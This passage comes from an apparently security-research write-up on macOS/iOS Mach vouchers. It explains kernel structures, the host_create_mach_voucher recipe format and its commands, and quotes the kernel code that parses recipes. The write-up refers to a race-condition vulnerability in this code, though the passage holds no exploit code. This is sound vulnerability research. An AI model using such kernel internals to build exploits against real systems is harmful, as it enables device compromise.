 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; iv_index_t &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;e_sum</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; iv_index_t &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;e_hash</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; queue_chain_t &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; e_hash_link</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; uint8_t &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; e_data</span><span class="BGLtzooHlW-c2">[];</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c2">};</span></p></td></tr></tbody></table>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span>Each inline </span><span class="BGLtzooHlW-c11">e_data</span><span>&nbsp;buffer can be up to 16KB. </span><span class="BGLtzooHlW-c11">e_hash_link</span><span class="BGLtzooHlW-c10">&nbsp;stores the hash-table bucket list pointer.</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span class="BGLtzooHlW-c11">e_made</span><span>&nbsp;is not a simple reference count. Looking through the code you&#39;ll notice that there are no places where it&#39;s ever decremented. Since there should (nearly) always be a 1:1 mapping between an </span><span class="BGLtzooHlW-c11">ivace_entry</span><span>&nbsp;and a </span><span class="BGLtzooHlW-c11">user_data_value_element</span><span>&nbsp;this structure shouldn&#39;t need to be reference counted. There is however one very fiddly race condition (which </span><span class="BGLtzooHlW-c17">isn&#39;t</span><span>&nbsp;the race condition which causes the vulnerability!) which necessitates the </span><span class="BGLtzooHlW-c11">e_made</span><span class="BGLtzooHlW-c10">&nbsp;field. This race condition is sort-of documented and we&#39;ll get there eventually...</span></p><h2 class="BGLtzooHlW-c18 BGLtzooHlW-c5" id="h.o5bp0ln346i3"><span class="BGLtzooHlW-c20">Recipes</span></h2>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span>The </span><span class="BGLtzooHlW-c11">host_create_mach_voucher</span><span>&nbsp;host port </span><span>MIG</span><span>&nbsp;(</span><span class="BGLtzooHlW-c21"><a class="BGLtzooHlW-c251" href="https://www.nextop.de/NeXTstep_3.3_Developer_Documentation/OperatingSystem/Part1_Mach/02_Messages/Messages.htmld/index.html">Mach Interface Generator</a></span><span class="BGLtzooHlW-c10">) method is the userspace interface for creating vouchers:</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p><a id="t.3b86534681bae3851c58fa2f335e430bc6b5a4cb"></a><a id="t.11"></a><table class="BGLtzooHlW-c12"><tbody><tr class="BGLtzooHlW-c1"><td class="BGLtzooHlW-c13" colspan="1" rowspan="1">
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c3">kern_return_t</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">host_create_mach_voucher</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">mach_port_name_t host</span><span class="BGLtzooHlW-c2">,</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; mach_voucher_attr_raw_recipe_array_t recipes</span><span class="BGLtzooHlW-c2">,</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; mach_voucher_attr_recipe_size_t recipesCnt</span><span class="BGLtzooHlW-c2">,</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; mach_port_name_t </span><span class="BGLtzooHlW-c2">*</span><span class="BGLtzooHlW-c4">voucher</span><span class="BGLtzooHlW-c2">);</span></p></td></tr></tbody></table>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span class="BGLtzooHlW-c11">recipes</span><span>&nbsp;points to a buffer filled with a sequence of packed variable-size </span><span class="BGLtzooHlW-c11">mach_voucher_attr_recipe_data</span><span class="BGLtzooHlW-c10">&nbsp;structures:</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p><a id="t.fb086444030469a009e799e34240bece6d1dd33b"></a><a id="t.12"></a><table class="BGLtzooHlW-c12"><tbody><tr class="BGLtzooHlW-c1"><td class="BGLtzooHlW-c13" colspan="1" rowspan="1">
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c6">typedef</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c6">struct</span><span class="BGLtzooHlW-c4">&nbsp;mach_voucher_attr_recipe_data </span><span class="BGLtzooHlW-c2">{</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; mach_voucher_attr_key_t &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;key</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; mach_voucher_attr_recipe_command_t command</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; mach_voucher_name_t &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;previous_voucher</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; mach_voucher_attr_content_size_t &nbsp; content_size</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; uint8_t &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;content</span><span class="BGLtzooHlW-c2">[];</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c2">}</span><span class="BGLtzooHlW-c4">&nbsp;mach_voucher_attr_recipe_data_t</span><span class="BGLtzooHlW-c2">;</span></p></td></tr></tbody></table>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span class="BGLtzooHlW-c11">key</span><span>&nbsp;is one of the four supported voucher attr types we&#39;ve seen before (importance, bank, pthread_priority and user_data) or a wildcard value (</span><span class="BGLtzooHlW-c11">MACH_VOUCHER_ATTR_KEY_ALL</span><span>) indicating that the command should apply to all keys. There are a number of generic commands as well as type-specific commands. Commands can optionally refer to existing vouchers via the </span><span class="BGLtzooHlW-c11">previous_voucher</span><span class="BGLtzooHlW-c10">&nbsp;field, which should name a voucher port.</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span class="BGLtzooHlW-c10">Here are the supported generic commands for voucher creation:</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span class="BGLtzooHlW-c11">MACH_VOUCHER_ATTR_COPY</span><span class="BGLtzooHlW-c10">: copy the attr value from the previous voucher. You can specify the wildcard key to copy all the attr values from the previous voucher.</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span class="BGLtzooHlW-c11">MACH_VOUCHER_ATTR_REMOVE</span><span class="BGLtzooHlW-c10">: remove the specified attr value from the voucher under construction. This can also remove all the attributes from the voucher under construction (which, arguably, makes no sense.)</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span class="BGLtzooHlW-c11">MACH_VOUCHER_ATTR_SET_VALUE_HANDLE:</span><span>&nbsp;this command is only valid for kernel clients; it allows the caller to specify an arbitrary </span><span class="BGLtzooHlW-c11">ivace_value</span><span class="BGLtzooHlW-c10">, which doesn&#39;t make sense for userspace and shouldn&#39;t be reachable.</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span class="BGLtzooHlW-c11">MACH_VOUCHER_ATTR_REDEEM</span><span>: the semantics of </span><span class="BGLtzooHlW-c14">redeeming</span><span class="BGLtzooHlW-c10">&nbsp;an attribute from a previous voucher are not defined by the voucher code; it&#39;s up to the individual managers to determine what that might mean.</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span class="BGLtzooHlW-c10">Here are the attr-specific commands for voucher creation for each type:</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span class="BGLtzooHlW-c17">bank</span><span class="BGLtzooHlW-c10">:</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span class="BGLtzooHlW-c11 BGLtzooHlW-c19">MACH_VOUCHER_ATTR_BANK_CREATE</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span class="BGLtzooHlW-c19 BGLtzooHlW-c11">MACH_VOUCHER_ATTR_BANK_MODIFY_PERSONA</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span class="BGLtzooHlW-c19 BGLtzooHlW-c11">MACH_VOUCHER_ATTR_AUTO_REDEEM</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span class="BGLtzooHlW-c19 BGLtzooHlW-c11">MACH_VOUCHER_ATTR_SEND_PREPROCESS</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span class="BGLtzooHlW-c17">importance</span><span class="BGLtzooHlW-c10">:</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span class="BGLtzooHlW-c19 BGLtzooHlW-c11">MACH_VOUCHER_ATTR_IMPORTANCE_SELF</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span class="BGLtzooHlW-c17">user_data</span><span class="BGLtzooHlW-c10">:</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span class="BGLtzooHlW-c19 BGLtzooHlW-c11">MACH_VOUCHER_ATTR_USER_DATA_STORE</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span class="BGLtzooHlW-c17">pthread_priority</span><span class="BGLtzooHlW-c10">:</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span class="BGLtzooHlW-c19 BGLtzooHlW-c11">MACH_VOUCHER_ATTR_PTHPRIORITY_CREATE</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span>Note that there are further commands which can be &quot;executed against&quot; vouchers via the </span><span class="BGLtzooHlW-c11">mach_voucher_attr_command</span><span>&nbsp;MIG method which calls the attr manager&#39;s&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="BGLtzooHlW-c11">ivam_command</span><span class="BGLtzooHlW-c10">&nbsp;function pointer. Those are:</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span class="BGLtzooHlW-c17">bank</span><span class="BGLtzooHlW-c10">:</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span class="BGLtzooHlW-c19 BGLtzooHlW-c11">BANK_ORIGINATOR_PID</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span class="BGLtzooHlW-c19 BGLtzooHlW-c11">BANK_PERSONA_TOKEN</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span class="BGLtzooHlW-c19 BGLtzooHlW-c11">BANK_PERSONA_ID</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span class="BGLtzooHlW-c17">importance</span><span class="BGLtzooHlW-c10">:</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span class="BGLtzooHlW-c19 BGLtzooHlW-c11">MACH_VOUCHER_IMPORTANCE_ATTR_DROP_EXTERNAL</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span class="BGLtzooHlW-c17">user_data</span><span class="BGLtzooHlW-c10">:</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span class="BGLtzooHlW-c10">none</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span class="BGLtzooHlW-c17">pthread_priority</span><span class="BGLtzooHlW-c10">:</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span class="BGLtzooHlW-c10">none</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span>Let&#39;s look at example recipe for creating a voucher with a single </span><span class="BGLtzooHlW-c11">user_data</span><span class="BGLtzooHlW-c10">&nbsp;attr, consisting of the 4 bytes {0x41, 0x41, 0x41, 0x41}:</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p><a id="t.a9632b719aa64a5ca7f22f3e9944b5fd0708e9e6"></a><a id="t.13"></a><table class="BGLtzooHlW-c12"><tbody><tr class="BGLtzooHlW-c1"><td class="BGLtzooHlW-c13" colspan="1" rowspan="1">
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c6">struct</span><span class="BGLtzooHlW-c4">&nbsp;udata_dword_recipe </span><span class="BGLtzooHlW-c2">{</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; mach_voucher_attr_recipe_data_t recipe</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; uint32_t payload</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c2">};</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c8"><span class="BGLtzooHlW-c3"></span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c6">struct</span><span class="BGLtzooHlW-c4">&nbsp;udata_dword_recipe r </span><span class="BGLtzooHlW-c2">=</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">{</span><span class="BGLtzooHlW-c15">0</span><span class="BGLtzooHlW-c2">};</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">r</span><span class="BGLtzooHlW-c2">.</span><span class="BGLtzooHlW-c4">recipe</span><span class="BGLtzooHlW-c2">.</span><span class="BGLtzooHlW-c4">key </span><span class="BGLtzooHlW-c2">=</span><span class="BGLtzooHlW-c4">&nbsp;MACH_VOUCHER_ATTR_KEY_USER_DATA</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">r</span><span class="BGLtzooHlW-c2">.</span><span class="BGLtzooHlW-c4">recipe</span><span class="BGLtzooHlW-c2">.</span><span class="BGLtzooHlW-c4">command </span><span class="BGLtzooHlW-c2">=</span><span class="BGLtzooHlW-c4">&nbsp;MACH_VOUCHER_ATTR_USER_DATA_STORE</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">r</span><span class="BGLtzooHlW-c2">.</span><span class="BGLtzooHlW-c4">recipe</span><span class="BGLtzooHlW-c2">.</span><span class="BGLtzooHlW-c4">content_size </span><span class="BGLtzooHlW-c2">=</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c6">sizeof</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">uint32_t</span><span class="BGLtzooHlW-c2">);</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">r</span><span class="BGLtzooHlW-c2">.</span><span class="BGLtzooHlW-c4">payload </span><span class="BGLtzooHlW-c2">=</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c15">0x41414141</span><span class="BGLtzooHlW-c2">;</span></p></td></tr></tbody></table>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span class="BGLtzooHlW-c10">Let&#39;s follow the path of this recipe in detail.</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span>Here&#39;s the most important part of </span><span class="BGLtzooHlW-c11">host_create_mach_voucher</span><span class="BGLtzooHlW-c10">&nbsp;showing the three high-level phases: voucher allocation, attribute creation and voucher de-duping. It&#39;s not the responsibility of this code to find or allocate a mach port for the voucher; that&#39;s done by the MIG layer code.</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p><a id="t.caafa58444ef86dee8c472d187debed00ee56da7"></a><a id="t.14"></a><table class="BGLtzooHlW-c12"><tbody><tr class="BGLtzooHlW-c1"><td class="BGLtzooHlW-c13" colspan="1" rowspan="1">
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c7">/* allocate new voucher */</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">voucher </span><span class="BGLtzooHlW-c2">=</span><span class="BGLtzooHlW-c4">&nbsp;iv_alloc</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">ivgt_keys_in_use</span><span class="BGLtzooHlW-c2">);</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c6">if</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">IV_NULL </span><span class="BGLtzooHlW-c2">==</span><span class="BGLtzooHlW-c4">&nbsp;voucher</span><span class="BGLtzooHlW-c2">)</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">{</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; </span><span class="BGLtzooHlW-c6">return</span><span class="BGLtzooHlW-c4">&nbsp;KERN_RESOURCE_SHORTAGE</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c2">}</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c8"><span class="BGLtzooHlW-c3"></span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c7">/* iterate over the recipe items */</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c6">while</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c15">0</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">&lt;</span><span class="BGLtzooHlW-c4">&nbsp;recipe_size </span><span class="BGLtzooHlW-c2">-</span><span class="BGLtzooHlW-c4">&nbsp;recipe_used</span><span class="BGLtzooHlW-c2">)</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">{</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; ipc_voucher_t prev_iv</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c8"><span class="BGLtzooHlW-c3"></span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; </span><span class="BGLtzooHlW-c6">if</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">recipe_size </span><span class="BGLtzooHlW-c2">-</span><span class="BGLtzooHlW-c4">&nbsp;recipe_used </span><span class="BGLtzooHlW-c2">&lt;</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c6">sizeof</span><span class="BGLtzooHlW-c2">(*</span><span class="BGLtzooHlW-c4">sub_recipe</span><span class="BGLtzooHlW-c2">))</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">{</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; kr </span><span class="BGLtzooHlW-c2">=</span><span class="BGLtzooHlW-c4">&nbsp;KERN_INVALID_ARGUMENT</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; </span><span class="BGLtzooHlW-c6">break</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; </span><span class="BGLtzooHlW-c2">}</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c8"><span class="BGLtzooHlW-c3"></span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; </span><span class="BGLtzooHlW-c7">/* find the next recipe */</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; sub_recipe </span><span class="BGLtzooHlW-c2">=</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; </span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">mach_voucher_attr_recipe_t</span><span class="BGLtzooHlW-c2">)(</span><span class="BGLtzooHlW-c6">void</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">*)&amp;</span><span class="BGLtzooHlW-c4">recipes</span><span class="BGLtzooHlW-c2">[</span><span class="BGLtzooHlW-c4">recipe_used</span><span class="BGLtzooHlW-c2">];</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c8"><span class="BGLtzooHlW-c3"></span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; </span><span class="BGLtzooHlW-c6">if</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">recipe_size </span><span class="BGLtzooHlW-c2">-</span><span class="BGLtzooHlW-c4">&nbsp;recipe_used </span><span class="BGLtzooHlW-c2">-</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c6">sizeof</span><span class="BGLtzooHlW-c2">(*</span><span class="BGLtzooHlW-c4">sub_recipe</span><span class="BGLtzooHlW-c2">)</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">&lt;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; sub_recipe</span><span class="BGLtzooHlW-c2">-&gt;</span><span class="BGLtzooHlW-c4">content_size</span><span class="BGLtzooHlW-c2">)</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">{</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; kr </span><span class="BGLtzooHlW-c2">=</span><span class="BGLtzooHlW-c4">&nbsp;KERN_INVALID_ARGUMENT</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; </span><span class="BGLtzooHlW-c6">break</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; </span><span class="BGLtzooHlW-c2">}</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c8"><span class="BGLtzooHlW-c3"></span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; recipe_used </span><span class="BGLtzooHlW-c2">+=</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c6">sizeof</span><span class="BGLtzooHlW-c2">(*</span><span class="BGLtzooHlW-c4">sub_recipe</span><span class="BGLtzooHlW-c2">)</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">+</span><span class="BGLtzooHlW-c4">&nbsp;sub_recipe</span><span class="BGLtzooHlW-c2">-&gt;</span><span class="BGLtzooHlW-c4">content_size</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c8"><span class="BGLtzooHlW-c3"></span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; </span><span class="BGLtzooHlW-c7">/* convert voucher port name (current space) */</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; </span><span class="BGLtzooHlW-c7">/* into a voucher reference */</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; prev_iv </span><span class="BGLtzooHlW-c2">=</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; convert_port_name_to_voucher</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">sub_recipe</span><span class="BGLtzooHlW-c2">-&gt;</span><span class="BGLtzooHlW-c4">previous_voucher</span><span class="BGLtzooHlW-c2">);</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c8"><span class="BGLtzooHlW-c3"></span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; </span><span class="BGLtzooHlW-c6">if</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">MACH_PORT_NULL </span><span class="BGLtzooHlW-c2">!=</span><span class="BGLtzooHlW-c4">&nbsp;sub_recipe</span><span class="BGLtzooHlW-c2">-&gt;</span><span class="BGLtzooHlW-c4">previous_voucher </span><span class="BGLtzooHlW-c2">&amp;&amp;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; IV_NULL </span><span class="BGLtzooHlW-c2">==</span><span class="BGLtzooHlW-c4">&nbsp;prev_iv</span><span class="BGLtzooHlW-c2">)</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">{</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; kr </span><span class="BGLtzooHlW-c2">=</span><span class="BGLtzooHlW-c4">&nbsp;KERN_INVALID_CAPABILITY</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; </span><span class="BGLtzooHlW-c6">break</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; </span><span class="BGLtzooHlW-c2">}</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c8"><span class="BGLtzooHlW-c3"></span></p>
